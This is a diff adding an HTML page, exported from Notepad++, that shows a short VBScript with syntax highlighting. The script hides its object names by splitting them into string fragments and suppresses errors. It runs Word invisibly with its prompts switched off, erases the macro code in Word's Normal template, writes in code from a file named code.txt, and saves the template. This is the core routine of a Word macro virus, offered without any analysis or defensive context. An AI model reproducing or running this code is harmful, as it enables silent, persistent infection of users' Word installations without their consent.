@@ -1,0 +1,59 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc2 {
+	font-weight: bold;
+	color: #FF0000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+	font-weight: bold;
+}
+.sc7 {
+}
+.sc11 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">error</span><span class="sc0"> </span><span class="sc3">resume</span><span class="sc0"> </span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc11">fs</span><span class="sc6">=</span><span class="sc4">"FileSystemObject"</span><span class="sc0">
+</span><span class="sc7">sc</span><span class="sc6">=</span><span class="sc4">"Scripting"</span><span class="sc0">
+</span><span class="sc7">wsc</span><span class="sc6">=</span><span class="sc4">"WScript"</span><span class="sc0">
+</span><span class="sc7">sh</span><span class="sc6">=</span><span class="sc4">"Shell"</span><span class="sc0">
+</span><span class="sc7">crlf</span><span class="sc6">=</span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">13</span><span class="sc6">)&amp;</span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">10</span><span class="sc6">)</span><span class="sc0">
+
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc7">sc</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"."</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc11">fs</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">ws</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc7">wsc</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"."</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">sh</span><span class="sc6">)</span><span class="sc0">
+
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">wrd</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Word.Application"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">wrd.Visible</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
+</span><span class="sc7">wrd.Options.SaveNormalPrompt</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
+</span><span class="sc7">wrd.Options.ConfirmConversions</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">nor</span><span class="sc6">=</span><span class="sc7">wrd.NormalTemplate.vbproject.vbcomponents</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">).</span><span class="sc7">codemodule</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">iw</span><span class="sc6">=</span><span class="sc7">fso.OpenTextFile</span><span class="sc6">(</span><span class="sc4">"code.txt"</span><span class="sc6">,</span><span class="sc2">1</span><span class="sc6">,</span><span class="sc3">True</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">nor.DeleteLines</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc7">nor.CountOfLines</span><span class="sc0">
+</span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
+</span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">iw.atendofstream</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
+</span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">iw.ReadLine</span><span class="sc0">
+</span><span class="sc7">nor.InsertLines</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">b</span><span class="sc0">
+</span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
+</span><span class="sc3">Loop</span><span class="sc0">
+</span><span class="sc7">wrd.NormalTemplate.Save</span><span class="sc0">
+</span><span class="sc7">wrd.Quit</span></div></body>
+</html>
